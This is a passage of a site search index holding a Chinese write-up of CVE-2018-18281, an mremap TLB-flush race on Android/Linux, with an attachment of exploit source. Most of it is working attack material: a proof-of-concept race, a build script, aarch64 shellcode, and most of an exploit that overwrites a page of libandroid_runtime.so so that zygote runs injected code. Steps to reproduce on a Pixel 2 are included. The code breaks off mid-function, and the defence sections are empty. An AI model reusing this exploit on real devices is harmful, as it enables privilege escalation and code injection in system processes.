\u4ecb\u7ecd\u4e86\u4e00\u79cd\u7b97\u6cd5\u7528\u4e8e\u7cbe\u786e\u63a7\u5236\u4e00\u4e2a file page cache \u7684\u52a0\u8f7d    1) \u6253\u5f00\u4e00\u4e2a\u5927\u6587\u4ef6 a, mmap \u5230\u5185\u5b58   2) \u6253\u5f00\u76ee\u6807\u6587\u4ef6 b, mmap \u5230\u5185\u5b58  3) \u5728\u4e00\u4e2a\u5faa\u73af\u5185, \u6267\u884c:   3.1) \u6309\u7167 pagesize \u9010\u9875\u9762\u8bfb\u53d6 a \u7684\u5185\u5bb9\n        \u8fd9\u4f1a\u5bfc\u81f4\u5185\u6838\u7533\u8bf7\u5927\u91cf page cache \u6765\u88c5\u8f7d\u6587\u4ef6 a, \n    \u4ece\u800c\u8feb\u4f7f\u5176\u4ed6\u6587\u4ef6\u7684 page cache \u88ab\u7f6e\u6362\u5230\u786c\u76d8  3.2) \u5224\u65ad\u76ee\u6807\u9875\u9762 X \u662f\u5426\u5728\u5185\u5b58\u91cc, \u5982\u679c\u4e0d\u662f, \u8df3\u8f6c\u5230 4.1    4) \u5728\u4e00\u4e2a\u5faa\u73af\u5185, \u6267\u884c:  4.1) \u6309\u7167 pagesize \u9010\u9875\u9762\u8bfb\u53d6 b \u7684\u5185\u5bb9, \u4f46\u9047\u5230\u76ee\u6807\u9875\u9762 X \u5219\u8df3\u8fc7\n           \u8fd9\u4f1a\u5bfc\u81f4\u76ee\u6807\u6587\u4ef6\u9664\u76ee\u6807\u9875\u9762 X \u4e4b\u5916\u5176\u4ed6\u9875\u9762\u88ab\u91cd\u65b0\u88c5\u8f7d\u56de\u5185\u5b58  4.2) \u5224\u65ad\u76ee\u6807\u9875\u9762 X \u662f\u5426\u5728\u5185\u5b58\u91cc, \u5982\u679c\u662f, \u8df3\u8f6c\u5230 3.1    5) \u5982\u679c\u8bfb\u53d6\u5b8c\u5168\u90e8 b \u7684\u5185\u5bb9, \u76ee\u6807\u9875\u9762 X \u4ecd\u7136\u6ca1\u6709\u5728\u5185\u5b58\u91cc, \u7ed3\u675f.   \u901a\u8fc7\u4e0a\u8ff0\u7b97\u6cd5, \u53ef\u4ee5\u8ba9\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u76ee\u6807\u9875\u9762 X \u88ab\u7f6e\u6362\u5230\u786c\u76d8, \u800c\u8be5\u6587\u4ef6\u5176\u4ed6\u9875\u9762\u4fdd\u7559\u5728\u5185\u5b58\u91cc, \u8fd9\u6837\u5728\u6f0f\u6d1e\u89e6\u53d1\u4e4b\u540e, \u518d\u6765\u8bbf\u95ee\u76ee\u6807\u9875\u9762, \u5219\u5f88\u5927\u673a\u4f1a\u4f1a\u5206\u914d\u521a\u521a\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u7ed9\u76ee\u6807\u9875\u9762  \u6ce8\u610f:\n\nmincore \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u533a\u57df\u5185\u7684\u5185\u5b58\u662f\u5728\u7269\u7406\u5185\u5b58\u4e2d\u6216\u88ab\u4ea4\u6362\u51fa\u78c1\u76d8\n\u4e0a\u8ff0\u7b97\u6cd5\u5728 linux \u7684\u5b9e\u73b0\u4f9d\u8d56\u4e8e mincore",
            "title": "\u5229\u7528\u601d\u8def"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#bexp",
            "text": "exploit\u6e90\u7801  \u4e3b\u8981\u5305\u542b\u4e0b\u9762\u51e0\u4e2a\u6587\u4ef6:   compile.sh  shellcode.s  exp.c  watchdog.c",
            "title": "b.EXP\u6e90\u7801"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#compilesh",
            "text": "\u8fd9\u662f\u7f16\u8bd1\u811a\u672c  1) aarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  \n2) aarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode \n3) aarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode \n4) xxd -i arm_shellcode.bin > arm_shellcode.h \n5) make  1~3 \u662f\u5c06\u6c47\u7f16\u6587\u4ef6 arm_shellcode.s \u7f16\u8bd1\u6210\u4e8c\u8fdb\u5236\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5 (.text) \u63d0\u53d6\u5230\u6587\u4ef6 arm_shellcode.bin   4 \u4f7f\u7528 linux \u7684 xxd \u5de5\u5177\u5c06 arm_shellcode.bin \u653e\u8fdb\u4e00\u4e2a c \u8bed\u8a00\u5206\u683c\u7684\u6570\u7ec4\uff0c\u540e\u7eed\u5728 c \u4ee3\u7801\u91cc\u4ee5\u6570\u7ec4\u53d8\u91cf\u7684\u5f62\u5f0f\u64cd\u4f5c\u5b83  5 \u6839\u636e Android.mk \u7f16\u8bd1\u53ef\u6267\u884c\u6587\u4ef6",
            "title": "compile.sh"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#shellcodes",
            "text": "\u4e0b\u9762\u7b80\u5355\u770b\u4e00\u4e0b shellcode.s \u6c47\u7f16,\u4e0d\u611f\u5174\u8da3\u53ef\u4ee5\u7565\u8fc7    shellcode.s \u672c\u8eab\u5f88\u7b80\u5355: \u8bfb\u53d6\u6587\u4ef6 \u201c/proc/self/attr/current\u201d \uff0c\u7136\u540e\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u8c03\u7528 sethostname \u51fd\u6570\uff0c\u4ece\u800c\u66f4\u6539\u7cfb\u7edf\u7684 hostname    \u56e0\u4e3a\u666e\u901a app \u6ca1\u6709\u6743\u9650\u8c03\u7528\u7cfb\u7edf\u51fd\u6570 'sethostname', \u672c exploit \u901a\u8fc7\u6ce8\u5165 shellcode.s \u5230 libandroid_runtime.so, \u7136\u540e\u89e6\u53d1 zygote \u8fdb\u7a0b\u6267\u884c shellcode.s \u8fbe\u5230\u8d8a\u6743\u6267\u884c\u7684\u76ee\u7684    // open file\n_start:\nmov x0, #-100\nadrp x1, _start\n// NOTE: We are changing the page-relative alignment of the shellcode, so normal\n// aarch64 RIP-relative addressing doesn't work.\nadd x1, x1, attr_path-file_start\nmov x2, #0\nmov x8, #0x38\nsvc #0\n\nattr_path:\n.ascii \"/proc/self/attr/current\\0\"  \u7b2c\u4e00\u6bb5\u6c47\u7f16\u4f5c\u7528\u662f open \u6587\u4ef6 \"/proc/self/attr/current\", #0x38 \u662f\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 __NR_openat (\u7cfb\u7edf\u8c03\u7528\u53f7\u5b9a\u4e49\uff1a include/uapi/asm-generic/unistd.h), \u5c06 0x38 \u653e\u5165 x8 \u5bc4\u5b58\u5668\uff0csvc #0 \u6307\u4ee4\u89e6\u53d1\u8f6f\u4e2d\u65ad\uff0c\u8fdb\u5165\u5185\u6838\u7cfb\u7edf\u8c03\u7528, \u6839\u636e openat \u51fd\u6570\u7684\u5b9a\u4e49, x1 \u5bc4\u5b58\u5668\u5b58\u653e\u8981\u6253\u5f00\u7684\u6587\u4ef6\u8def\u5f84\u7684\u5730\u5740, x0 \u548c x2 \u8fd9\u91cc\u5ffd\u7565.  \u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e\uff0cx0\u5bc4\u5b58\u5668\u5b58\u653e\u8fd4\u56de\u503c\uff0c\u5373\u6253\u5f00\u6587\u4ef6\u7684 fd  // read from file\nsub sp, sp, #128\nmov x1, sp\nmov x2, #128\nmov x8, #0x3f\nsvc #0  \u7b2c\u4e8c\u6bb5\u6c47\u7f16\u6267\u884c read \u7cfb\u7edf\u8c03\u7528\uff0c\u8bfb\u53d6 128 \u5b57\u8282\u653e\u5165\u6808, #0x3f \u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 read, x0 \u5b58\u653e\u8981\u8bfb\u53d6\u6587\u4ef6\u7684 fd, x1 \u662f\u6808\u9876\u6307\u9488 sp, \u5728\u6b64\u4e4b\u524d\uff0csp \u88ab\u79fb\u52a8\u4e86#128 \u5b57\u8282\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a 128 \u5b57\u8282\u7684\u6808\u6570\u7ec4\u4f5c\u4e3a buf\u4f20\u7ed9 read \u51fd\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570, x2 \u662f\u8981\u8bfb\u53d6\u7684\u957f\u5ea6, \u8fd9\u91cc\u662f 128  \u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e, sp \u6307\u5411\u7684\u4f4d\u7f6e\u5b58\u653e\u6587\u4ef6 '/proc/self/attr/current' \u7684\u5185\u5bb9  // shove file contents into hostname\nmov x1, x0\nmov x0, sp\nmov x8, #0xa1\nsvc #0  \u7b2c\u4e09\u6bb5\u6c47\u7f16\u6267\u884c sethostname \u7cfb\u7edf\u8c03\u7528, #0xa1 \u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 sethostname, x0 \u5373\u8981\u66f4\u65b0\u7684\u57df\u540d\u5b57\u7b26\u4e32, \u8fd9\u91cc\u653e\u5165 sp \u6307\u9488\uff0c \u5373\u5c06\u4e0a\u4e00\u6b65 read \u51fd\u6570\u8bfb\u53d6\u7684 buf \u503c\u4f5c\u4e3a sethostname \u7684\u53c2\u6570 name, x1 \u662f\u957f\u5ea6, \u8fd9\u91cc\u503c\u662f\u4e0a\u4e00\u6b65read \u7684\u8fd4\u56de\u503c  \u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e, hostname \u5c06\u88ab\u66f4\u65b0\u4e3a\u6587\u4ef6 '/proc/self/attr/current' \u7684\u5185\u5bb9",
            "title": "shellcode.s"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#watchdogc",
            "text": "\u8fd9\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u662f\u4e0d\u65ad\u8c03\u7528 exp \u53ef\u6267\u884c\u6587\u4ef6\u5e76\u76d1\u63a7 exploit \u662f\u5426\u6210\u529f, \u4e4b\u6240\u4ee5\u9700\u8981\u8fd9\u4e2a\u4e3b\u8c03\u7a0b\u5e8f\u662f\u7531\u4e8e\u8fd9\u4e2a\u6f0f\u6d1e\u5728\u89e6\u53d1\u7684\u65f6\u5019, \u5927\u90e8\u5206\u60c5\u51b5\u4f1a\u5f15\u53d1\u7a0b\u5e8f\u5954\u6e83, \u8fd9\u65f6\u5019\u9700\u8981\u4e00\u4e2a\u770b\u95e8\u72d7\u7a0b\u5e8f\u4e0d\u65ad\u91cd\u542f\u5b83",
            "title": "watchdog.c"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#expc",
            "text": "\u8fd9\u4e2a\u6587\u4ef6\u5b9e\u73b0\u4e86 exploit \u7684\u4e3b\u4f53\u529f\u80fd   kickout_victim_page \u51fd\u6570  idle_worker \u7ebf\u7a0b  spinner \u7ebf\u7a0b  nicer_spinner \u7ebf\u7a0b  read_worker \u7ebf\u7a0b  segv_handler \u51fd\u6570   kickout_victim_page \u51fd\u6570\u5b9e\u73b0\u4e86  \u5982\u4f55\u63d0\u9ad8\u6587\u4ef6 page cache \u547d\u4e2d\u7387  \u7684\u7b97\u6cd5, \u6700\u5f00\u59cb\u6267\u884c  idle_worker \u7ebf\u7a0b\u7528\u4e8e\u89e6\u53d1 mremap \u8c03\u7528, \u5148\u7ed1\u5b9a\u5230 c1, spinner \u5524\u9192\u540e\u91cd\u7ed1\u5b9a idle_worker \u5230 c3, \u8c03\u5ea6\u7b56\u7565\u4e3a SCHED_IDLE , \u5176\u4ed6\u7ebf\u7a0b\u90fd\u662f\u666e\u901a\u8c03\u5ea6\u7b56\u7565  spinner \u7ebf\u7a0b\u7528\u4e8e\u89e6\u53d1 fallocate (\u8ddf ftruncate \u6548\u679c\u7c7b\u4f3c) \u8c03\u7528\u4ee5\u91ca\u653e\u7269\u7406\u9875\u9762, \u7136\u540e\u7acb\u523b\u8c03\u7528 read \u8bfb\u53d6\u76ee\u6807\u5730\u5740, \u4e89\u53d6\u8ba9\u76ee\u6807\u5730\u5740\u4f7f\u7528\u521a\u521a\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u4f5c\u4e3a page cache, \u7ed1\u5b9a\u5230 c2   nicer_spinner \u7ebf\u7a0b\u7ed1\u5b9a\u5230 c3, \u7528\u4e8e\u62a2\u5360 idle_worker  \u7684 cpu \u4f7f\u7528\u6743  read_worker \u7ebf\u7a0b\u7ed1\u5b9a\u5230 c4, \u7528\u4e8e\u76d1\u63a7\u76ee\u6807\u5185\u5b58, \u4e00\u65e6\u53d1\u73b0 race \u6210\u529f\u89e6\u53d1, \u5219\u6ce8\u5165 shellcode \u5230\u76ee\u6807\u5185\u5b58  segv_handler \u51fd\u6570\u662f\u6bb5\u9519\u8bef\u5904\u7406\u51fd\u6570, \u8fd9\u91cc\u4f1a\u518d\u4e00\u6b21\u68c0\u6d4b shellcode \u662f\u5426\u5df2\u7ecf\u6210\u529f\u6ce8\u5165\u5230\u76ee\u6807\u6587\u4ef6, \u5982\u679c\u662f, \u5219\u901a\u77e5 watchdog \u505c\u6b62\u91cd\u542f exp  \u6267\u884c exploit \u4e4b\u524d, libandroid_runtime.so \u5982\u4e0b  adb pull /system/lib64/libandroid_runtime.so\n\nroot@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so \n00157000: 0871 0091 5f00 08eb c000 0054 e087 41a9  .q.._......T..A.\n00157010: e303 1f32 0800 40f9 0801 43f9 0001 3fd6  ...2..@...C...?.\n00157020: 2817 40f9 a983 5af8 1f01 09eb e110 0054  (.@...Z........T\n00157030: ff03 1191 fd7b 45a9 f44f 44a9 f657 43a9  .....{E..OD..WC.\n00157040: f85f 42a9 fa67 41a9 fc6f c6a8 c003 5fd6  ._B..gA..o...._.\n00157050: f801 00b0 d901 00b0 ba01 00f0 7b02 00f0  ............{...\n00157060: 9c01 0090    \u6267\u884c exploit \u4e4b\u540e, libandroid_runtime.so \u5982\u4e0b  adb pull /system/lib64/libandroid_runtime.so\n\nroot@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so \n00157000: 0000 20d4 0000 20d4 600c 8092 0100 0090  .. ... .`.......\n00157010: 2120 0191 0200 80d2 0807 80d2 0100 00d4  ! ..............\n00157020: ff03 02d1 e103 0091 0210 80d2 e807 80d2  ................\n00157030: 0100 00d4 e103 00aa e003 0091 2814 80d2  ............(...\n00157040: 0100 00d4 0000 0014 2f70 726f 632f 7365  ......../proc/se\n00157050: 6c66 2f61 7474 722f 6375 7272 656e 7400  lf/attr/current.\n00157060: eaff ff17                                ....",
            "title": "exp.c"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#c_3",
            "text": "It was tested in pixel2 with fingerprint: google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys  run \"sh compile.sh\" to build the exploit\nrun \"adb push libs/arm64-v8a/_exp /data/local/tmp/\"\nrun \"adb push libs/arm64-v8a/exp /data/local/tmp/\"\nadb shell to login pixel2 and run '/data/local/tmp/exp'",
            "title": "c.\u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#d_2",
            "text": "\uff08\u51e0\u53e5\u8bdd\u8bf4\u6e05\u695a\u5229\u7528\u8def\u5f84\uff09",
            "title": "d.\u5229\u7528\u539f\u7406\u7cbe\u51c6\u6982\u62ec"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#5",
            "text": "\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a",
            "title": "5.\u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#a_2",
            "text": "",
            "title": "a.\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#b_2",
            "text": "",
            "title": "b.\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#c_4",
            "text": "",
            "title": "c.\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#6",
            "text": "mremap TLB flush too late with concurrent ftruncate  Taking a page from the kernel's book: A TLB issue in mremap  Swapping and the Page Cache  patch \u8ba8\u8bba",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/kernel/cve-2018-18281-\u9644\u4ef6/",
            "text": "TLB \u7f13\u5b58\u5ef6\u8fdf\u5237\u65b0\u6f0f\u6d1e(cve-2018-18281)\u5206\u6790\u9644\u4ef6\n\n\npoc \u6e90\u7801\n\n\n#define _GNU_SOURCE\n\n//I test the poc in pixel2 with fingerprint: google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n\n#include <pthread.h>\n#include <stdio.h>\n#include <fcntl.h>\n#include <err.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/prctl.h>\n#include <sched.h>\n#include <errno.h>\n#include <sys/syscall.h>\n\n#define ul unsigned long\n\nstatic int alloc_fd = -1;\nint g_worker_tid;\nint worker_launch_pipe[2];\nint spinner_cont_pipe[2];\n\n#define allocptr ((void*)0x1000000000UL)\n#define allocptr2 ((void*)0x2000000000UL)\n#define TLB_USAGE 200\n#define AREA_SIZE   0x20000000\n#define CORE_0  3\n#define CORE_1 4\n#define CORE_2 5 \n#define CORE_3 6 \n\nvoid pin_task_to(int pid, int cpu) {\n  cpu_set_t cset;\n  CPU_ZERO(&cset);\n  CPU_SET(cpu, &cset);\n  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))\n    err(1, \"affinity\");\n}\nvoid pin_to(int cpu) { pin_task_to(0, cpu); }\n\nunsigned long get_pt_size(int status_fd) {\n  char buf[0x1000 + 1];\n  ssize_t res = pread(status_fd, buf, 0x1000, 0);\n  if (res <= 0)\n    err(1, \"status read\");\n  buf[res] = 0;\n  char *p = strstr(buf, \"VmPTE:\");\n  if (!p) errx(1, \"bad status\");\n  p +=  6;\n  while (*p == '\\t' || *p == ' ') p++;\n  return strtoul(p, NULL, 10);\n}\n\nvoid tell_succ() {\n  int fd = open(\"/data/local/tmp/succ\", O_CREAT|O_RDWR);\n  write(fd, \"stage 1 ok\", 16);\n  close(fd);\n}\n\nvoid *nicer_spinner(void *dummy) {\n  pin_to(CORE_0);\n  while (1);\n}\n\nvoid *reader_fn(void *dummy) {\n  pin_to(CORE_3);\n  while (1) {\n   for (int i=0; i<TLB_USAGE; i++) {\n    ul x = *(ul *)(allocptr + 0x1000UL * i);\n    if (x != 0x4141414141414141UL) {\n      printf(\"GOT 0x%016lx\\n\", x);\n      tell_succ();\n    }\n  }\n  }\n}\n\nvoid *truncate_fn(void *dummy) {\n  pin_to(CORE_1);\n\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  char scpc;\n  if (read(spinner_cont_pipe[0], &scpc, 1) != 1)\n    errx(1, \"read scp\");\n\n  pin_task_to(g_worker_tid, CORE_0);\n     //if (ftruncate(alloc_fd, 0)) err(1, \"ftruncate\");\n     if (fallocate(alloc_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, \"fallocate\");\n\n    while (1) pause();\n\n}\n\nvoid *idle_worker(void *dummy) {\n  g_worker_tid = syscall(__NR_gettid);\n\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  struct sched_param param = {\n    .sched_priority = 0\n  };\n  if (sched_setscheduler(0, SCHED_IDLE, &param))\n    err(1, \"sched_setscheduler\");\n\n  sleep(2); \n\n  if (mremap(allocptr, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, allocptr2) != allocptr2) err(1, \"mremap\");\n\n  while (1) pause();\n}\n\nint main(void) {\n  setbuf(stdout, NULL);\n\n  printf(\"try triggerring..\\n\");\n\n  pin_to(CORE_1);\n\n  if (pipe(worker_launch_pipe) || pipe(spinner_cont_pipe))\n    err(1, \"pipe\");\n\n  alloc_fd = syscall(__NR_memfd_create, \"truncate-me\", 0);\n  if (alloc_fd == -1) err(1, \"create\");\n  if (ftruncate(alloc_fd, AREA_SIZE)) err(1, \"trunc init\");\n  if (mmap(allocptr, AREA_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, alloc_fd, 0) != allocptr)\n    err(1, \"mmap 1\");\n  if (madvise(allocptr, AREA_SIZE, MADV_NOHUGEPAGE) && errno != EINVAL)\n    err(1, \"advice\");\n  memset(allocptr, 0x41, AREA_SIZE);\n\n  pthread_t thread;\n  if (pthread_create(&thread, NULL, idle_worker, NULL)) err(1, \"idler\");\n  if (pthread_create(&thread, NULL, truncate_fn, NULL)) err(1, \"truncater\");\n  if (pthread_create(&thread, NULL, nicer_spinner, NULL)) err(1, \"pthread_create\");\n  if (pthread_create(&thread, NULL, reader_fn, NULL)) errx(1, \"reader\");\n\n  pin_to(CORE_2);\n\n  char wlpc;\n  if (read(worker_launch_pipe[0], &wlpc, 1) != 1 || read(worker_launch_pipe[0], &wlpc, 1) != 1)\n    errx(1, \"read wlp\");\n\n  int status_fd = open(\"/proc/self/status\", O_RDONLY);\n  if (status_fd == -1)\n    err(1, \"open status\");\n\n  unsigned long orig = get_pt_size(status_fd);\n  int bumped = 0;\n  while (1) {\n    unsigned long nsize = get_pt_size(status_fd);\n    if (nsize != orig) {\n      if (!bumped) {\n        if (write(spinner_cont_pipe[1], \"x\", 1) != 1)\n          errx(1, \"spinner_cont_pipe\");\n\n        bumped = 1;\n      }\n\n      orig = nsize;\n    }\n  }\n\n  pause();\n\n  return 0;\n}\n\n\n\n\nexp \u6e90\u7801\n\n\ncompile.sh\n\n\n\n!/bin/sh\n\n# This should be a C compiler from an android \"standalone toolchain\" as\n# documented at <https://developer.android.com/ndk/guides/standalone_toolchain>.\n# Statically linking against glibc doesn't work here because for multithreaded\n# code, glibc tries to use set_robust_list, which immediately causes the program\n# to be killed by seccomp.\n#CC=$HOME/android-sdk/sa-tch/bin/clang\nCC=/data3/aosp/prebuilts/clang/host/linux-x86/clang-4579689/bin/clang\n\n# Prepare shellcode - this can use any aarch64 toolchain.\n# NOTE: We are changing the page-relative alignment of the shellcode, so normal\n# aarch64 RIP-relative addressing doesn't work.\naarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  # \u5c06\u6c47\u7f16\u6587\u4ef6 arm_shellcode.s \u6c47\u7f16\u6210 .o \u6587\u4ef6\naarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode # \u5c06 .o \u94fe\u63a5\u6210\u53ef\u6267\u884c elf \u6587\u4ef6\naarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode # \u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5 .text \u63d0\u53d6\u5230\u6587\u4ef6 arm_shellcode.bin \nxxd -i arm_shellcode.bin > arm_shellcode.h # \u5c06\u4e8c\u8fdb\u5236\u6587\u4ef6\u653e\u8fdb\u4e00\u4e2ac \u8bed\u8a00\u5206\u683c\u7684\u6570\u7ec4\u53d8\u91cf\uff0c\u540e\u7eed\u5728c\u4ee3\u7801\u91cc\u4ee5\u6570\u7ec4\u64cd\u4f5c\u5b83\nrm arm_shellcode.o arm_shellcode arm_shellcode.bin\n# need android-ndk-r18b to build\nmake\n\n\n\n\n\narm_shellcode.s\n\n\n.global _start\n\n// signature\nfile_start:\nbrk #0\nbrk #0\n\n// open file\n_start:\nmov x0, #-100\nadrp x1, _start\n// NOTE: We are changing the page-relative alignment of the shellcode, so normal\n// aarch64 RIP-relative addressing doesn't work.\nadd x1, x1, attr_path-file_start\nmov x2, #0\nmov x8, #0x38\nsvc #0\n\n// read from file\nsub sp, sp, #128\nmov x1, sp\nmov x2, #128\nmov x8, #0x3f\nsvc #0\n\n// shove file contents into hostname\nmov x1, x0\nmov x0, sp\nmov x8, #0xa1\nsvc #0\n\n// spin\nspin_label:\nb spin_label\n\nattr_path:\n.ascii \"/proc/self/attr/current\\0\"\n\nrept_start:\n.rept (0x1000 - (rept_start - file_start)) / 4\nb _start\n.endr\n\n\n\n\nexp.c\n\n\n// for Pixel 2, build google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n// 20190304, chengjia4574@gmail.com\n// code is from Jann Horn\n\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <sys/syscall.h>\n#include <pthread.h>\n#include <sched.h>\n#include <err.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <string.h>\n#include <sys/time.h>\n#include <errno.h>\n#include <sys/prctl.h>\n#include <signal.h>\n\n\n#include \"arm_shellcode.h\"\n\n#define RAM_SIZE (3744240UL*1024UL)\n#define SPAM_SIZE (RAM_SIZE * 2)\n\n#define VICTIM_FILE \"/system/lib64/libandroid_runtime.so\"\n#define VICTIM_SIZE   0x21cef0\n#define VICTIM_OFFSET 0x157000\n#define EXPECTED_CODE 0xeb08005f91007108UL\n\n#define CORE_TARPIT  3\n#define CORE_MUNMAP  4\n#define CORE_CLOBBER 5\n#define CORE_PREEMPT 6\n\n#define TLB_USAGE 200\n\n#define ADDR1 ((void*)0x1000000000UL)\n#define ADDR2 ((void*)0x2000000000UL)\n\n#define AREA_SIZE   0x20000000\n\nint file_fd = -1;\nint victim_file_fd = -1;\nint worker_launch_pipe[2];\nint spinner_cont_pipe[2];\nvolatile int worker_tid = -1;\nvolatile int spinner_verbose = 0;\nvolatile int spinner_tid = -1;\nvolatile int spinner_state = 0;\nvolatile int worker_seen_spinner = 0;\nvolatile int swap_count;\nvolatile unsigned long seen_values[1000];\nvolatile int seen_values_ctr = 0;\nvolatile int slot_log = -1;\n\nbool check_in_core(void *ptr) {\n  unsigned char c;\n  if (mincore(ptr, 0x1000, &c)) err(1, \"mincore\");\n  return c & 1;\n}\n\nvoid pin_task_to(int pid, int cpu) {\n  cpu_set_t cset;\n  CPU_ZERO(&cset);\n  CPU_SET(cpu, &cset);\n  if (sched_setaffinity(pid, sizeof(cpu_set_t), &cset))\n    err(1, \"affinity\");\n}\nvoid pin_to(int cpu) { pin_task_to(0, cpu); }\n\nunsigned long get_us() {\n  struct timeval tv;\n  if (gettimeofday(&tv, NULL))\n    err(1, \"gettimeofday\");\n  return ((unsigned long)tv.tv_sec)*1000000UL + (unsigned long)tv.tv_usec;\n}\n\nunsigned long get_pt_size(int status_fd) {\n  char buf[0x1000 + 1];\n  ssize_t res = pread(status_fd, buf, 0x1000, 0);\n  if (res <= 0)\n    err(1, \"status read\");\n  buf[res] = 0;\n  char *p = strstr(buf, \"VmPTE:\");\n  if (!p) errx(1, \"bad status\");\n  p +=  6;\n  while (*p == '\\t' || *p == ' ') p++;\n  return strtoul(p, NULL, 10);\n}\n\nvoid *idle_worker(void *dummy) {\n  worker_tid = syscall(__NR_gettid);\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  struct sched_param param = {\n    .sched_priority = 0\n  };\n  if (sched_setscheduler(0, SCHED_IDLE, &param))\n    err(1, \"sched_setscheduler\");\n\n  sleep(2);\n\n  if (mremap(ADDR1, AREA_SIZE, AREA_SIZE, MREMAP_FIXED|MREMAP_MAYMOVE, ADDR2) != ADDR2)\n    err(1, \"mremap\");\n\n  while (1) pause();\n}\n\nvoid *nicer_spinner(void *dummy) {\n  pin_to(CORE_TARPIT);\n  while (1);\n}\n\nvoid *spinner(void *dummy) {\n  bool trunc_seen = false;\n  spinner_tid = syscall(__NR_gettid);\n  if (write(worker_launch_pipe[1], \"X\", 1) != 1)\n    errx(1, \"write wlp\");\n\n  int wss_shown = 0;\n\n  char scpc;\n  if (read(spinner_cont_pipe[0], &scpc, 1) != 1)\n    errx(1, \"read scp\");\n\n  while (1) {\n    int wss = worker_seen_spinner;\n    if (wss != wss_shown) {\n      wss_shown = wss;\n      printf(\"worker has seen %d\\n\", wss);\n    }\n    if (spinner_verbose) {\n      if (!trunc_seen) {\n        spinner_state++;\n        pin_task_to(worker_tid, CORE_TARPIT);\n        if (fallocate(file_fd, FALLOC_FL_PUNCH_HOLE|FALLOC_FL_KEEP_SIZE, 0, TLB_USAGE*0x1000)) err(1, \"fallocate\");\n        char dummy_buf[1];\n        if (pread(victim_file_fd, dummy_buf, 1, VICTIM_OFFSET) != 1) err(1, \"pread\");\n\n        void *pin_map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED|MAP_LOCKED, victim_file_fd, VICTIM_OFFSET);\n        if (pin_map == MAP_FAILED) {\n          err(1, \"pin_map\");\n        }\n\n        while (1) /*spin*/;\n      }\n      spinner_verbose = 0;\n      spinner_state++;\n      printf(\"spinnnnner\\n\");\n    }\n  }\n}\n\nvoid tell_succ() {\n  int fd = open(\"/data/local/tmp/succ\", O_CREAT);\n  write(fd, \"stage 1 ok\", 16);\n  close(fd);\n}\n\n\nvoid segv_handler(int dummy) {\n  write(1, \"TLB flush received\\n\", 19);\n\n  // yes, yes, stdio in signal handler. it's 